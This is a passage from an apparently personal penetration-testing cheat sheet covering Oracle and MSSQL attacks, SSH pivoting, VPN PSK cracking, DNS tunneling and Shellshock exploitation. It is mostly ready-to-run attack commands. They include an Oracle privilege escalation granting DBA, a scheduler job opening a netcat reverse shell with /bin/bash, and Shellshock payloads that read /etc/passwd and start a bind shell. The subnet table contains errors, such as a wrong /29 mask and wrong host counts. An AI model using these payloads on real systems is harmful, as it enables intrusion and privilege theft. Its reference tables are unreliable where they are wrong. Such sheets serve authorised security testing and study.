<h5 id="Identify-default-accounts-within-oracle-db-using-NMAP-NSE-scripts"><a href="#Identify-default-accounts-within-oracle-db-using-NMAP-NSE-scripts" class="headerlink" title="Identify default accounts within oracle db using NMAP NSE scripts:"></a>Identify default accounts within oracle db using NMAP NSE scripts:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nmap --script=oracle-sid-brute</div><div class="line">nmap --script=oracle-brute</div></pre></td></tr></table></figure>
<p>Login using the identified weak account (assuming you find one).</p>
<h5 id="How-to-identify-the-current-privilege-level-for-an-oracle-user"><a href="#How-to-identify-the-current-privilege-level-for-an-oracle-user" class="headerlink" title="How to identify the current privilege level for an oracle user:"></a>How to identify the current privilege level for an oracle user:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">SQL&gt; select * from session_privs;</div><div class="line"></div><div class="line">SQL&gt; CREATE OR REPLACE FUNCTION GETDBA(FOO varchar) return varchar deterministic authid</div><div class="line">curren_user is</div><div class="line">pragma autonomous_transaction;</div><div class="line">begin</div><div class="line">execute immediate &apos;grant dba to user1 identified by pass1&apos;;</div><div class="line">commit;</div><div class="line">return &apos;FOO&apos;;</div><div class="line">end;</div></pre></td></tr></table></figure>
<h5 id="Oracle-priv-esc-and-obtain-DBA-access"><a href="#Oracle-priv-esc-and-obtain-DBA-access" class="headerlink" title="Oracle priv esc and obtain DBA access:"></a>Oracle priv esc and obtain DBA access:</h5><p>Run netcat: <code>netcat -nvlp 443</code>code&gt;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SQL&gt; create index exploit_1337 on SYS.DUAL(SCOTT.GETDBA(&apos;BAR&apos;));</div></pre></td></tr></table></figure>
<h5 id="Run-the-exploit-with-a-select-query"><a href="#Run-the-exploit-with-a-select-query" class="headerlink" title="Run the exploit with a select query:"></a>Run the exploit with a select query:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SQL&gt; Select * from session_privs;</div></pre></td></tr></table></figure>
<p>You should have a DBA user with creds user1 and pass1.</p>
<p>Verify you have DBA privileges by re-running the first command again.</p>
<h5 id="Remove-the-exploit-using"><a href="#Remove-the-exploit-using" class="headerlink" title="Remove the exploit using:"></a>Remove the exploit using:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">drop index exploit_1337;</div></pre></td></tr></table></figure>
<h5 id="Get-Oracle-Reverse-os-shell"><a href="#Get-Oracle-Reverse-os-shell" class="headerlink" title="Get Oracle Reverse os-shell:"></a>Get Oracle Reverse os-shell:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">begin</div><div class="line">dbms_scheduler.create_job( job_name    =&gt; &apos;MEH1337&apos;,job_type    =&gt;</div><div class="line">    &apos;EXECUTABLE&apos;,job_action =&gt; &apos;/bin/nc&apos;,number_of_arguments =&gt; 4,start_date =&gt;</div><div class="line">    SYSTIMESTAMP,enabled    =&gt; FALSE,auto_drop =&gt; TRUE);</div><div class="line">dbms_scheduler.set_job_argument_value(&apos;rev_shell&apos;, 1, &apos;TARGET-IP&apos;);</div><div class="line">dbms_scheduler.set_job_argument_value(&apos;rev_shell&apos;, 2, &apos;443&apos;);</div><div class="line">dbms_scheduler.set_job_argument_value(&apos;rev_shell&apos;, 3, &apos;-e&apos;);</div><div class="line">dbms_scheduler.set_job_argument_value(&apos;rev_shell&apos;, 4, &apos;/bin/bash&apos;);</div><div class="line">dbms_scheduler.enable(&apos;rev_shell&apos;);</div><div class="line">end;</div></pre></td></tr></table></figure>
<h3 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h3><p>Enumeration / Discovery:</p>
<p>Nmap:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -sU --script=ms-sql-info 192.168.1.108 192.168.1.156</div></pre></td></tr></table></figure>
<p>Metasploit:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msf &gt; use auxiliary/scanner/mssql/mssql_ping</div></pre></td></tr></table></figure>
<h5 id="Use-MS-SQL-Servers-Browse-For-More"><a href="#Use-MS-SQL-Servers-Browse-For-More" class="headerlink" title="Use MS SQL Servers Browse For More"></a>Use MS SQL Servers Browse For More</h5><p>Try using “Browse for More” via MS SQL Server Management Studio</p>
<h4 id="Bruteforce-MSSQL-Login"><a href="#Bruteforce-MSSQL-Login" class="headerlink" title="Bruteforce MSSQL Login"></a>Bruteforce MSSQL Login</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msf &gt; use auxiliary/admin/mssql/mssql_enum</div></pre></td></tr></table></figure>
<h4 id="Metasploit-MSSQL-Shell"><a href="#Metasploit-MSSQL-Shell" class="headerlink" title="Metasploit MSSQL Shell"></a>Metasploit MSSQL Shell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">msf &gt; use exploit/windows/mssql/mssql_payload</div><div class="line">msf exploit(mssql_payload) &gt; set PAYLOAD windows/meterpreter/reverse_tcp</div></pre></td></tr></table></figure>
<h2 id="Network"><a href="#Network" class="headerlink" title="Network"></a>Network</h2><h3 id="Plink-exe-Tunnel"><a href="#Plink-exe-Tunnel" class="headerlink" title="Plink.exe Tunnel"></a>Plink.exe Tunnel</h3><p>PuTTY Link tunnel</p>
<p>Forward remote port to local address:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">plink.exe -P 22 -l root -pw &quot;1337&quot; -R 445:127.0.0.1:445 REMOTE-IP</div></pre></td></tr></table></figure>
<h3 id="Pivoting"><a href="#Pivoting" class="headerlink" title="Pivoting"></a>Pivoting</h3><h4 id="SSH-Pivoting"><a href="#SSH-Pivoting" class="headerlink" title="SSH Pivoting"></a>SSH Pivoting</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh -D 127.0.0.1:1010 -p 22 user@pivot-target-ip</div></pre></td></tr></table></figure>
<p>Add socks4 127.0.0.1 1010 in /etc/proxychains.conf</p>
<p>SSH pivoting from one network to another:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh -D 127.0.0.1:1010 -p 22 user1@ip-address-1</div></pre></td></tr></table></figure>
<p>Add socks4 127.0.0.1 1010 in /etc/proxychains.conf</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">proxychains ssh -D 127.0.0.1:1011 -p 22 user1@ip-address-2</div></pre></td></tr></table></figure>
<p>Add socks4 127.0.0.1 1011 in /etc/proxychains.conf</p>
<h4 id="Meterpreter-Pivoting"><a href="#Meterpreter-Pivoting" class="headerlink" title="Meterpreter Pivoting"></a>Meterpreter Pivoting</h4><h3 id="TTL-Finger-Printing"><a href="#TTL-Finger-Printing" class="headerlink" title="TTL Finger Printing"></a>TTL Finger Printing</h3><table>
<thead>
<tr>
<th>Operating System</th>
<th>TTL Size</th>
</tr>
</thead>
<tbody>
<tr>
<td>Windows</td>
<td><code>128</code></td>
</tr>
<tr>
<td>Linux</td>
<td><code>64</code></td>
</tr>
<tr>
<td>Solaris</td>
<td><code>255</code></td>
</tr>
<tr>
<td>Cisco / Network</td>
<td><code>255</code></td>
</tr>
</tbody>
</table>
<h3 id="IPv4-Cheat-Sheets"><a href="#IPv4-Cheat-Sheets" class="headerlink" title="IPv4 Cheat Sheets"></a>IPv4 Cheat Sheets</h3><h4 id="Classful-IP-Ranges"><a href="#Classful-IP-Ranges" class="headerlink" title="Classful IP Ranges"></a>Classful IP Ranges</h4><p>E.g Class A,B,C (depreciated)</p>
<table>
<thead>
<tr>
<th>Class</th>
<th>IP Address Range</th>
</tr>
</thead>
<tbody>
<tr>
<td>Class A IP Address Range</td>
<td><code>0.0.0.0 - 127.255.255.255</code></td>
</tr>
<tr>
<td>Class B IP Address Range</td>
<td><code>128.0.0.0 - 191.255.255.255</code></td>
</tr>
<tr>
<td>Class C IP Address Range</td>
<td><code>192.0.0.0 - 223.255.255.255</code></td>
</tr>
<tr>
<td>Class D IP Address Range</td>
<td><code>224.0.0.0 - 239.255.255.255</code></td>
</tr>
<tr>
<td>Class E IP Address Range</td>
<td><code>240.0.0.0 - 255.255.255.255</code></td>
</tr>
</tbody>
</table>
<h4 id="IPv4-Private-Address-Ranges"><a href="#IPv4-Private-Address-Ranges" class="headerlink" title="IPv4 Private Address Ranges"></a>IPv4 Private Address Ranges</h4><table>
<thead>
<tr>
<th>Class</th>
<th>Range</th>
</tr>
</thead>
<tbody>
<tr>
<td>Class A Private Address Range</td>
<td><code>10.0.0.0 - 10.255.255.255</code></td>
</tr>
<tr>
<td>Class B Private Address Range</td>
<td><code>172.16.0.0 - 172.31.255.255</code></td>
</tr>
<tr>
<td>Class C Private Address Range</td>
<td><code>192.168.0.0 - 192.168.255.255</code></td>
</tr>
<tr>
<td></td>
<td><code>127.0.0.0 - 127.255.255.255</code></td>
</tr>
</tbody>
</table>
<h4 id="IPv4-Subnet-Cheat-Sheet"><a href="#IPv4-Subnet-Cheat-Sheet" class="headerlink" title="IPv4 Subnet Cheat Sheet"></a>IPv4 Subnet Cheat Sheet</h4><p>Subnet cheat sheet, not really realted to pen testing but a useful reference.</p>
<table>
<thead>
<tr>
<th>CIDR</th>
<th>Decimal Mask</th>
<th>Number of Hosts</th>
</tr>
</thead>
<tbody>
<tr>
<td>/31</td>
<td><code>255.255.255.254</code></td>
<td><code>1 Host</code></td>
</tr>
<tr>
<td>/30</td>
<td><code>255.255.255.252</code></td>
<td><code>2 Hosts</code></td>
</tr>
<tr>
<td>/29</td>
<td><code>255.255.255.249</code></td>
<td><code>6 Hosts</code></td>
</tr>
<tr>
<td>/28</td>
<td><code>255.255.255.240</code></td>
<td><code>14 Hosts</code></td>
</tr>
<tr>
<td>/27</td>
<td><code>255.255.255.224</code></td>
<td><code>30 Hosts</code></td>
</tr>
<tr>
<td>/26</td>
<td><code>255.255.255.192</code></td>
<td><code>62 Hosts</code></td>
</tr>
<tr>
<td>/25</td>
<td><code>255.255.255.128</code></td>
<td><code>126 Hosts</code></td>
</tr>
<tr>
<td>/24</td>
<td><code>255.255.255.0</code></td>
<td><code>254 Hosts</code></td>
</tr>
<tr>
<td>/23</td>
<td><code>255.255.254.0</code></td>
<td><code>512 Host</code></td>
</tr>
<tr>
<td>/22</td>
<td><code>255.255.252.0</code></td>
<td><code>1022 Hosts</code></td>
</tr>
<tr>
<td>/21</td>
<td><code>255.255.248.0</code></td>
<td><code>2046 Hosts</code></td>
</tr>
<tr>
<td>/20</td>
<td><code>255.255.240.0</code></td>
<td><code>4094 Hosts</code></td>
</tr>
<tr>
<td>/19</td>
<td><code>255.255.224.0</code></td>
<td><code>8190 Hosts</code></td>
</tr>
<tr>
<td>/18</td>
<td><code>255.255.192.0</code></td>
<td><code>16382 Hosts</code></td>
</tr>
<tr>
<td>/17</td>
<td><code>255.255.128.0</code></td>
<td><code>32766 Hosts</code></td>
</tr>
<tr>
<td>/16</td>
<td><code>255.255.0.0</code></td>
<td><code>65534 Hosts</code></td>
</tr>
<tr>
<td>/15</td>
<td><code>255.254.0.0</code></td>
<td><code>131070 Hosts</code></td>
</tr>
<tr>
<td>/14</td>
<td><code>255.252.0.0</code></td>
<td><code>262142 Hosts</code></td>
</tr>
<tr>
<td>/13</td>
<td><code>255.248.0.0</code></td>
<td><code>524286 Hosts</code></td>
</tr>
<tr>
<td>/12</td>
<td><code>255.240.0.0</code></td>
<td><code>1048674 Hosts</code></td>
</tr>
<tr>
<td>/11</td>
<td><code>255.224.0.0</code></td>
<td><code>2097150 Hosts</code></td>
</tr>
<tr>
<td>/10</td>
<td><code>255.192.0.0</code></td>
<td><code>4194302 Hosts</code></td>
</tr>
<tr>
<td>/9</td>
<td><code>255.128.0.0</code></td>
<td><code>8388606 Hosts</code></td>
</tr>
<tr>
<td>/8</td>
<td><code>255.0.0.0</code></td>
<td><code>16777214 Hosts</code></td>
</tr>
</tbody>
</table>
<h3 id="VLAN-Hopping"><a href="#VLAN-Hopping" class="headerlink" title="VLAN Hopping"></a>VLAN Hopping</h3><p>Using NCCGroups VLAN wrapper script for Yersina simplifies the process.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/nccgroup/vlan-hopping.git</div><div class="line">chmod 700 frogger.sh</div><div class="line">./frogger.sh</div></pre></td></tr></table></figure>
<h3 id="VPN-Pentesting-Tools"><a href="#VPN-Pentesting-Tools" class="headerlink" title="VPN Pentesting Tools"></a>VPN Pentesting Tools</h3><p>Identify VPN servers:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./udp-protocol-scanner.pl -p ike TARGET(s)</div></pre></td></tr></table></figure>
<p>Scan a range for VPN servers:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./udp-protocol-scanner.pl -p ike -f ip.txt</div></pre></td></tr></table></figure>
<h4 id="IKEForce"><a href="#IKEForce" class="headerlink" title="IKEForce"></a>IKEForce</h4><p>Use IKEForce to enumerate or dictionary attack VPN servers.</p>
<p>Install:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">pip install pyip</div><div class="line">git clone https://github.com/SpiderLabs/ikeforce.git</div></pre></td></tr></table></figure>
<p>Perform IKE VPN enumeration with IKEForce:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./ikeforce.py TARGET-IP &amp;#x2013;e &amp;#x2013;w wordlists/groupnames.dic</div></pre></td></tr></table></figure>
<p>Bruteforce IKE VPN using IKEForce:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./ikeforce.py TARGET-IP -b -i groupid -u dan -k psk123 -w passwords.txt -s 1</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">ike-scan</div><div class="line">ike-scan TARGET-IP</div><div class="line">ike-scan -A TARGET-IP</div><div class="line">ike-scan -A TARGET-IP --id=myid -P TARGET-IP-key</div></pre></td></tr></table></figure>
<h4 id="IKE-Aggressive-Mode-PSK-Cracking"><a href="#IKE-Aggressive-Mode-PSK-Cracking" class="headerlink" title="IKE Aggressive Mode PSK Cracking"></a>IKE Aggressive Mode PSK Cracking</h4><ol>
<li>Identify VPN Servers</li>
<li>Enumerate with IKEForce to obtain the group ID</li>
<li>Use ike-scan to capture the PSK hash from the IKE endpoint</li>
<li>Use psk-crack to crack the hash</li>
</ol>
<h5 id="Step-1-Idenitfy-IKE-Servers"><a href="#Step-1-Idenitfy-IKE-Servers" class="headerlink" title="Step 1: Idenitfy IKE Servers"></a>Step 1: Idenitfy IKE Servers</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./udp-protocol-scanner.pl -p ike SUBNET/24</div></pre></td></tr></table></figure>
<h5 id="Step-2-Enumerate-group-name-with-IKEForce"><a href="#Step-2-Enumerate-group-name-with-IKEForce" class="headerlink" title="Step 2: Enumerate group name with IKEForce"></a>Step 2: Enumerate group name with IKEForce</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./ikeforce.py TARGET-IP &amp;#x2013;e &amp;#x2013;w wordlists/groupnames.dic</div></pre></td></tr></table></figure>
<h5 id="Step-3-Use-ike-scan-to-capture-the-PSK-hash"><a href="#Step-3-Use-ike-scan-to-capture-the-PSK-hash" class="headerlink" title="Step 3: Use ike-scan to capture the PSK hash"></a>Step 3: Use ike-scan to capture the PSK hash</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ike-scan &amp;#x2013;M &amp;#x2013;A &amp;#x2013;n example_group -P hash-file.txt TARGET-IP</div></pre></td></tr></table></figure>
<h5 id="Step-4-Use-psk-crack-to-crack-the-PSK-hash"><a href="#Step-4-Use-psk-crack-to-crack-the-PSK-hash" class="headerlink" title="Step 4: Use psk-crack to crack the PSK hash"></a>Step 4: Use psk-crack to crack the PSK hash</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">psk-crack hash-file.txt</div></pre></td></tr></table></figure>
<p>Some more advanced psk-crack options below:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">pskcrack</div><div class="line">psk-crack -b 5 TARGET-IPkey</div><div class="line">psk-crack -b 5 --charset=&quot;01233456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot; 192-168-207-134key</div><div class="line">psk-crack -d /path/to/dictionary-file TARGET-IP-key</div></pre></td></tr></table></figure>
<h4 id="PPTP-Hacking"><a href="#PPTP-Hacking" class="headerlink" title="PPTP Hacking"></a>PPTP Hacking</h4><p>Identifying PPTP, it listens on TCP: 1723</p>
<h5 id="NMAP-PPTP-Fingerprint"><a href="#NMAP-PPTP-Fingerprint" class="headerlink" title="NMAP PPTP Fingerprint:"></a>NMAP PPTP Fingerprint:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap &amp;#x2013;Pn -sV -p 1723 TARGET(S)</div></pre></td></tr></table></figure>
<h5 id="PPTP-Dictionary-Attack"><a href="#PPTP-Dictionary-Attack" class="headerlink" title="PPTP Dictionary Attack"></a>PPTP Dictionary Attack</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">thc-pptp-bruter -u hansolo -W -w /usr/share/wordlists/nmap.lst</div></pre></td></tr></table></figure>
<h3 id="DNS-Tunneling"><a href="#DNS-Tunneling" class="headerlink" title="DNS Tunneling"></a>DNS Tunneling</h3><p>Tunneling data over DNS to bypass firewalls.</p>
<p>dnscat2 supports “download” and “upload” commands for getting files (data and programs) to and from the target machine.</p>
<h4 id="Attacking-Machine"><a href="#Attacking-Machine" class="headerlink" title="Attacking Machine"></a>Attacking Machine</h4><p>Installtion:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">apt-get update</div><div class="line">apt-get -y install ruby-dev git make g++</div><div class="line">gem install bundler</div><div class="line">git clone https://github.com/iagox86/dnscat2.git</div><div class="line">cd dnscat2/server</div><div class="line">bundle install</div></pre></td></tr></table></figure>
<p>Run dnscat2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ruby ./dnscat2.rb</div><div class="line">dnscat2&gt; New session established: 1422</div><div class="line">dnscat2&gt; session -i 1422</div></pre></td></tr></table></figure>
<p>Target Machine:</p>
<p><a href="https://downloads.skullsecurity.org/dnscat2/" target="_blank" rel="external">https://downloads.skullsecurity.org/dnscat2/</a><br><a href="https://github.com/lukebaggett/dnscat2-powershell/" target="_blank" rel="external">https://github.com/lukebaggett/dnscat2-powershell/</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">dnscat --host &lt;dnscat server_ip&gt;</div></pre></td></tr></table></figure>
<h2 id="BOF-Exploit"><a href="#BOF-Exploit" class="headerlink" title="BOF / Exploit"></a>BOF / Exploit</h2><h2 id="Exploit-Research"><a href="#Exploit-Research" class="headerlink" title="Exploit Research"></a>Exploit Research</h2><p>Find exploits for enumerated hosts / services.</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>`searchsploit windows 2003</td>
<td>grep -i local`</td>
<td>Search exploit-db for exploit, in this example windows 2003 + local esc</td>
</tr>
<tr>
<td><code>site:exploit-db.com exploit kernel &lt;= 3</code></td>
<td>Use google to search exploit-db.com for exploits</td>
</tr>
<tr>
<td><code>grep -R &quot;W7&quot; /usr/share/metasploit-framework&lt;br&gt;/modules/exploit/windows/*</code></td>
<td>Search metasploit modules using grep - msf search sucks a bit</td>
</tr>
</tbody>
</table>
<h3 id="Searching-for-Exploits"><a href="#Searching-for-Exploits" class="headerlink" title="Searching for Exploits"></a>Searching for Exploits</h3><p>Install local copy of exploit-db:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">searchsploit &amp;#x2013;u</div><div class="line">searchsploit apache 2.2</div><div class="line">searchsploit &quot;Linux Kernel&quot;</div><div class="line">searchsploit linux 2.6 | grep -i ubuntu | grep local</div></pre></td></tr></table></figure>
<h3 id="Compiling-Windows-Exploits-on-Kali"><a href="#Compiling-Windows-Exploits-on-Kali" class="headerlink" title="Compiling Windows Exploits on Kali"></a>Compiling Windows Exploits on Kali</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">wget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download</div><div class="line">wine mingw-get-setup.exe</div><div class="line">select mingw32-base</div><div class="line">cd /root/.wine/drive_c/windows</div><div class="line">wget http://gojhonny.com/misc/mingw_bin.zip &amp;&amp; unzip mingw_bin.zip</div><div class="line">cd /root/.wine/drive_c/MinGW/bin</div><div class="line">wine gcc -o ability.exe /tmp/exploit.c -lwsock32</div><div class="line">wine ability.exe</div></pre></td></tr></table></figure>
<h3 id="Cross-Compiling-Exploits"><a href="#Cross-Compiling-Exploits" class="headerlink" title="Cross Compiling Exploits"></a>Cross Compiling Exploits</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">gcc -m32 -o output32 hello.c (32 bit)</div><div class="line">gcc -m64 -o output hello.c (64 bit)</div></pre></td></tr></table></figure>
<h3 id="Exploiting-Common-Vulnerabilities"><a href="#Exploiting-Common-Vulnerabilities" class="headerlink" title="Exploiting Common Vulnerabilities"></a>Exploiting Common Vulnerabilities</h3><h4 id="Exploiting-Shellshock"><a href="#Exploiting-Shellshock" class="headerlink" title="Exploiting Shellshock"></a>Exploiting Shellshock</h4><p>A tool to find and exploit servers vulnerable to Shellshock:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/nccgroup/shocker</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./shocker.py -H TARGET  --command &quot;/bin/cat /etc/passwd&quot; -c /cgi-bin/status --verbose</div></pre></td></tr></table></figure>
<h5 id="cat-file-view-file-contents"><a href="#cat-file-view-file-contents" class="headerlink" title="cat file (view file contents)"></a>cat file (view file contents)</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo -e &quot;HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () &#123; :;&#125;; echo \$(&lt;/etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n&quot; | nc TARGET 80</div></pre></td></tr></table></figure>
<h5 id="Shell-Shock-run-bind-shell"><a href="#Shell-Shock-run-bind-shell" class="headerlink" title="Shell Shock run bind shell"></a>Shell Shock run bind shell</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo -e &quot;HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () &#123; :;&#125;; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n&quot; | nc TARGET 80</div></pre></td></tr></table></figure>
<h5 id="Shell-Shock-reverse-Shell"><a href="#Shell-Shock-reverse-Shell" class="headerlink" title="Shell Shock reverse Shell"></a>Shell Shock reverse Shell</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -l -p 443</div></pre></td></tr></table></figure>
<h2 id="Simple-Local-Web-Servers"><a href="#Simple-Local-Web-Servers" class="headerlink" title="Simple Local Web Servers"></a>Simple Local Web Servers</h2><p>Python local web server command, handy for serving up shells and exploits on an attacking machine.</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>python -m SimpleHTTPServer 80</code></td>
<td>Run a basic http server, great for serving up shells etc</td>
</tr>
<tr>
<td><code>python3 -m http.server</code></td>
<td>Run a basic Python3 http server, great for serving up shells etc</td>
</tr>
<tr>
<td><code>ruby -rwebrick -e &quot;WEBrick::HTTPServer.new&lt;br&gt;(:Port =&gt; 80, :DocumentRoot =&gt; Dir.pwd).start&quot;</code></td>
<td>Run a ruby webrick basic http server</td>
</tr>
<tr>
<td><code>php -S 0.0.0.0:80</code></td>
<td>Run a basic PHP http server</td>
</tr>
</tbody>
</table>
<h2 id="Mounting-File-Shares"><a href="#Mounting-File-Shares" class="headerlink" title="Mounting File Shares"></a>Mounting File Shares</h2><p>How to mount NFS / CIFS, Windows and Linux file shares.</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>mount 192.168.1.1:/vol/share /mnt/nfs</code></td>
<td>Mount NFS share to <code>/mnt/nfs</code></td>
</tr>
<tr>
<td><code>mount -t cifs -o username=user,password=pass&lt;br&gt;,domain=blah //192.168.1.X/share-name /mnt/cifs</code></td>
<td>Mount Windows CIFS / SMB share on Linux at <code>/mnt/cifs</code>if you remove password it will prompt on the CLI (more secure as it wont end up in bash_history)</td>
</tr>
<tr>
<td><code>net use Z: \\win-server\share password &lt;br&gt; /user:domain\janedoe /savecred /p:no</code></td>
<td>Mount a Windows share on Windows from the command line</td>
</tr>
<tr>
<td><code>apt-get install smb4k -y</code></td>
<td>Install smb4k on Kali, useful Linux GUI for browsing SMB shares</td>
</tr>
</tbody>
</table>
<h2 id="HTTP-HTTPS-Webserver-Enumeration"><a href="#HTTP-HTTPS-Webserver-Enumeration" class="headerlink" title="HTTP / HTTPS Webserver Enumeration"></a>HTTP / HTTPS Webserver Enumeration</h2><table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>nikto -h 192.168.1.1</code></td>
<td>Perform a nikto scan against target</td>
</tr>
<tr>
<td><code>dirbuster</code></td>
<td>Configure via GUI, CLI input doesn’t work most of the time</td>
</tr>
</tbody>
</table>
<h2 id="Packet-Inspection"><a href="#Packet-Inspection" class="headerlink" title="Packet Inspection"></a>Packet Inspection</h2><table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>tcpdump tcp port 80 -w output.pcap -i eth0</code></td>
<td>tcpdump for port 80 on interface eth0, outputs to output.pcap</td>
</tr>
</tbody>
</table>
<h2 id="Username-Enumeration"><a href="#Username-Enumeration" class="headerlink" title="Username Enumeration"></a>Username Enumeration</h2><p>Some techniques used to remotely enumerate users on a target system.</p>
<h3 id="SMB-User-Enumeration"><a href="#SMB-User-Enumeration" class="headerlink" title="SMB User Enumeration"></a>SMB User Enumeration</h3><table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>python /usr/share/doc/python-impacket-doc/examples&lt;br&gt;/samrdump.py 192.168.XXX.XXX</code></td>
<td>Enumerate users from SMB</td>
</tr>
<tr>
<td><code>ridenum.py 192.168.XXX.XXX 500 50000 dict.txt</code></td>
<td>RID cycle SMB / enumerate users from SMB</td>
</tr>
</tbody>
</table>
<h3 id="SNMP-User-Enumeration"><a href="#SNMP-User-Enumeration" class="headerlink" title="SNMP User Enumeration"></a>SNMP User Enumeration</h3><table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>`snmpwalk public -v1 192.168.X.XXX 1</td>
<td>grep 77.1.2.25 <br></td>
<td>cut -d&#x201D; &#x201C; -f4`</td>
<td>Enmerate users from SNMP</td>
</tr>
<tr>
